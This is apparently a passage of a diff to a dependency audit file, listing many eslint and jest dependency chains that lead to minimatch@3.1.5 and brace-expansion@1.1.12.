+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jest@25.7.0 > @typescript-eslint/eslint-plugin@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-jsx-a11y@6.10.2 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-react@7.37.5 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-react@7.37.5 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-react@7.37.5 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-react@7.37.5 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-react@7.37.5 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-react-hooks@4.6.2 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-react-hooks@4.6.2 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-react-hooks@4.6.2 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-react-hooks@4.6.2 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-testing-library@5.11.1 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-testing-library@5.11.1 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-testing-library@5.11.1 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-testing-library@5.11.1 > @typescript-eslint/utils@5.62.0 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-testing-library@5.11.1 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-testing-library@5.11.1 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-testing-library@5.11.1 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-config-react-app@7.0.1 > eslint-plugin-testing-library@5.11.1 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-react@7.37.5 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-react@7.37.5 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-react@7.37.5 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-react@7.37.5 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-react@7.37.5 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-react-hooks@7.0.1 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-react-hooks@7.0.1 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-react-hooks@7.0.1 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-react-hooks@7.0.1 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > @typescript-eslint/utils@8.57.2 > @eslint-community/eslint-utils@4.9.1 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > @typescript-eslint/utils@8.57.2 > @eslint-community/eslint-utils@4.9.1 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > @typescript-eslint/utils@8.57.2 > @eslint-community/eslint-utils@4.9.1 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > @typescript-eslint/utils@8.57.2 > @eslint-community/eslint-utils@4.9.1 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > @typescript-eslint/utils@8.57.2 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > @typescript-eslint/utils@8.57.2 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > @typescript-eslint/utils@8.57.2 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > @typescript-eslint/utils@8.57.2 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > eslint@8.57.0 > @eslint/eslintrc@2.1.4 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > eslint@8.57.0 > @humanwhocodes/config-array@0.11.14 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > eslint@8.57.0 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            ". > eslint-plugin-testing-library@7.16.2 > eslint@8.57.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
